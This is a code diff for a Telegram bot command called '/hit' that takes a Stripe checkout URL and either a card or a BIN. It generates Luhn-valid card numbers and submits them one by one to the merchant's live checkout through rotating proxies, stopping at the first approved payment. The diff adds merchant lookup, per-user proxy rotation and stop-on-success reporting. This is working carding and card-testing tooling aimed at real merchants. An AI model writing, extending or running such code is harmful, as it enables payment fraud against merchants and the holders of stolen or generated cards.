@@ -3,22 +3,16 @@ import time
 import asyncio
 import re
 from pyrogram import Client, filters
-from FUNC.usersdb_func import *
-from FUNC.defs import *
+from FUNC.defs import log_cmd_error
 from FUNC.cc_gen import luhn_card_genarator
-from TOOLS.check_all_func import *
-from TOOLS.getbin import *
+from FUNC.proxydb_func import get_random_user_proxy
+from TOOLS.check_all_func import check_some_thing
 from .response import get_hit_resp
 from .gate import hit_gate
+from .hitter_core import parse_checkout_url, retrieve_merchant_info
 
 _CC_RE = re.compile(r'(\d{15,18})[\/\s:|-]*?(\d{1,2})[\/\s:|-]*?(\d{2,4})[\/\s:|-]*?(\d{3,4})')
 _BIN_RE = re.compile(r'^(\d{6,16})$')
-
-_STATUS_ICON = {
-    "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅": "✅",
-    "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ❎": "❎",
-    "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌": "❌",
-}
 
 
 def _parse_cc(text):
@@ -35,7 +29,7 @@ def _parse_bin(text):
 async def hit_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
-        checkall = await check_all_thing(Client, message)
+        checkall = await check_some_thing(Client, message)
 
         gateway = "Stripe Hit [MO]"
         cmd = "/hit"
@@ -43,14 +37,11 @@ async def hit_cmd(Client, message):
         if checkall[0] == False:
             return
 
-        role = checkall[1]
         parts = message.text.split()
 
-        # ── Parse checkout URL ──
         if len(parts) < 2:
             await message.reply_text(f"""<b>
-Gate Name: {gateway} ♻️
-CMD: {cmd}
+{gateway} ♻️
 
 Message: Provide a Stripe checkout URL ❌
 
@@ -62,12 +53,11 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
 
         if "checkout.stripe.com" not in checkout_url and "cs_live" not in checkout_url and "cs_test" not in checkout_url:
             await message.reply_text(
-                f"<b>Gate Name: {gateway} ♻️\nCMD: {cmd}\n\nMessage: Invalid Stripe checkout URL ❌</b>",
+                f"<b>{gateway} ♻️\n\nMessage: Invalid Stripe checkout URL ❌</b>",
                 message.id,
             )
             return
 
-        # ── Parse input: full CC or BIN ──
         raw_input = None
         if len(parts) >= 3:
             raw_input = parts[2]
@@ -79,8 +69,7 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
 
         if not raw_input:
             await message.reply_text(f"""<b>
-Gate Name: {gateway} ♻️
-CMD: {cmd}
+{gateway} ♻️
 
 Message: No CC or BIN Found ❌
 
@@ -93,14 +82,39 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
 
         if not cc_tuple and not bin_str:
             await message.reply_text(f"""<b>
-Gate Name: {gateway} ♻️
-CMD: {cmd}
+{gateway} ♻️
 
 Message: Invalid CC or BIN format ❌
 
 Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
 Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
             return
+
+        # ── Fetch merchant info upfront (once) ──
+        proxy = await get_random_user_proxy(user_id)
+        merchant = "Unknown Merchant"
+        price = "N/A"
+        try:
+            cs_live, pk_live = parse_checkout_url(checkout_url)
+            minfo = await retrieve_merchant_info(cs_live, pk_live, proxy=proxy)
+            if minfo.get("error"):
+                await message.reply_text(
+                    f"<b>{gateway} ♻️\n\nCheckout Error: {minfo['error']} ❌</b>",
+                    message.id,
+                )
+                return
+            merchant = minfo.get("merchant") or merchant
+            price = minfo.get("price") or price
+            if merchant == "N/A":
+                merchant = "Unknown Merchant"
+        except ValueError as e:
+            await message.reply_text(
+                f"<b>{gateway} ♻️\n\nURL Parse Error: {e} ❌</b>",
+                message.id,
+            )
+            return
+        except Exception:
+            pass
 
         # ══════════════════════════════════════
         #  SINGLE CC MODE
@@ -109,37 +123,25 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
             cc, mes, ano, cvv = cc_tuple
             fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
-            progress = await message.reply_text(f"""
-↯ Checking.
+            progress = await message.reply_text(f"""<b>
+↯ Hitting...
 
-- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
+𝗖𝗮𝗿𝗱- <code>{fullcc}</code>
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
+𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
+𝐏𝐫𝐢𝐜𝐞- {price}
+
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ■■□□
 </b>""", message.id)
 
-            await asyncio.sleep(0.5)
-            progress = await Client.edit_message_text(message.chat.id, progress.id, f"""
-↯ Checking..
-
-- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
-""")
-
             start = time.perf_counter()
-            proxies = await get_proxy_format()
-            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxies)
-
-            getbin = await get_bin_details(cc)
+            proxy = await get_random_user_proxy(user_id)
+            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxy)
             getresp = await get_hit_resp(result, user_id, fullcc)
             status = getresp["status"]
             response = getresp["response"]
-            merchant = getresp["merchant"]
-            price = getresp["price"]
 
-            brand, typee, level, bank, country, flag, currency = getbin
-
-            await Client.edit_message_text(message.chat.id, progress.id, f"""
+            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
 {status}
 
 𝗖𝗮𝗿𝗱- <code>{fullcc}</code>
@@ -149,94 +151,118 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
 𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
 𝐏𝐫𝐢𝐜𝐞- {price}
 
-𝗜𝗻𝗳𝗼- {brand} - {typee} - {level}
-𝐁𝐚𝐧𝐤- {bank}
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}
-
 𝗧𝗶𝗺𝗲- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 </b>""")
-            await setantispamtime(user_id)
-            await deductcredit(user_id)
             return
 
         # ══════════════════════════════════════
         #  BIN MODE — generate 10 Luhn cards
         # ══════════════════════════════════════
-        getbin = await get_bin_details(bin_str)
-        brand, typee, level, bank, country, flag, currency = getbin
+        progress = await message.reply_text(f"""<b>
+↯ BIN Mode — Generating 10 cards
 
-        progress = await message.reply_text(f"""
-↯ <b>BIN Mode — Generating 10 cards</b>
-
-- 𝐁𝐈𝐍 - <code>{bin_str}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝗜𝗻𝗳𝗼 - {brand} - {typee} - {level}
-- 𝐁𝐚𝐧𝐤 - {bank}
-- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} {flag}
+𝐁𝐈𝐍- <code>{bin_str}</code>
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
+𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
+𝐏𝐫𝐢𝐜𝐞- {price}
 
 ⏳ Generating cards...
-""", message.id)
+</b>""", message.id)
 
         cards_raw = await luhn_card_genarator(bin_str, "None", "None", "None", 10)
         cards = [c.strip() for c in cards_raw.strip().split("\n") if c.strip()]
 
         if not cards:
             await Client.edit_message_text(message.chat.id, progress.id,
-                f"<b>Gate Name: {gateway} ♻️\n\nFailed to generate cards from BIN {bin_str} ❌</b>")
+                f"<b>{gateway} ♻️\n\nFailed to generate cards from BIN {bin_str} ❌</b>")
             return
 
         start = time.perf_counter()
-        results_lines = []
         checked = 0
+        approved = 0
+        declined = 0
+        stopped_reason = None
+        winner_cc = None
+        winner_resp = None
+        results_lines = []
 
         for card_str in cards:
             cc, mes, ano, cvv = card_str.split("|")
             fullcc = card_str
             checked += 1
 
-            bar = "■" * checked + "□" * (len(cards) - checked)
-            await Client.edit_message_text(message.chat.id, progress.id, f"""
-↯ <b>BIN Mode — Checking {checked}/{len(cards)}</b>
+            past = "\n".join(results_lines)
+            if past:
+                past += "\n"
 
-- 𝐁𝐈𝐍 - <code>{bin_str}</code>
-- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
-- 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 - {bar}
+            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
+↯ Hitting {checked}/{len(cards)}
 
-⏳ Hitting <code>{fullcc}</code>
-""")
+𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
+𝐏𝐫𝐢𝐜𝐞- {price}
 
-            proxies = await get_proxy_format()
-            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxies)
+{past}⏳ <code>{fullcc}</code>
+</b>""")
+
+            proxy = await get_random_user_proxy(user_id)
+            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxy)
             getresp = await get_hit_resp(result, user_id, fullcc)
             status = getresp["status"]
             response = getresp["response"]
 
-            icon = _STATUS_ICON.get(status, "❌")
+            if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" in status:
+                approved += 1
+                icon = "✅" if "✅" in status else "❎"
+            else:
+                declined += 1
+                icon = "❌"
+
             results_lines.append(f"{icon} <code>{fullcc}</code> → {response}")
 
+            if "✅" in status:
+                winner_cc = fullcc
+                winner_resp = response
+                stopped_reason = "Payment Successful ✅"
+                break
+
+            resp_lower = response.lower()
+            if "checkout_not_active_session" in resp_lower or "no longer active" in resp_lower:
+                stopped_reason = "Session Expired ⚠️"
+                break
+
         elapsed = time.perf_counter() - start
-        merchant = getresp.get("merchant", "N/A")
-        price = getresp.get("price", "N/A")
+        all_results = "\n".join(results_lines)
 
-        results_block = "\n".join(results_lines)
+        if winner_cc:
+            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
+𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
-        await Client.edit_message_text(message.chat.id, progress.id, f"""
-<b>𝐇𝐢𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 — BIN: <code>{bin_str}</code></b>
+𝗖𝗮𝗿𝗱- <code>{winner_cc}</code>
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{winner_resp}</i> ⤾
 
-{results_block}
+𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
+𝐏𝐫𝐢𝐜𝐞- {price}
+
+{all_results}
+
+𝐂𝐡𝐞𝐜𝐤𝐞𝐝- {checked}/{len(cards)} | ✅ {approved} | ❌ {declined}
+𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
+</b>""")
+        else:
+            stop_line = f"\n𝐒𝐭𝐨𝐩𝐩𝐞𝐝- {stopped_reason}" if stopped_reason else ""
+            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
+𝐇𝐢𝐭 𝐒𝐮𝐦𝐦𝐚𝐫𝐲 — BIN: <code>{bin_str}</code>
 
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
 𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
 𝐏𝐫𝐢𝐜𝐞- {price}
 
-𝗜𝗻𝗳𝗼- {brand} - {typee} - {level}
-𝐁𝐚𝐧𝐤- {bank}
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}
+{all_results}
 
+𝐂𝐡𝐞𝐜𝐤𝐞𝐝- {checked}/{len(cards)} | ✅ {approved} | ❌ {declined}{stop_line}
 𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
-""")
-        await setantispamtime(user_id)
-        await deductcredit(user_id)
+</b>""")
 
     except Exception:
         await log_cmd_error(message)
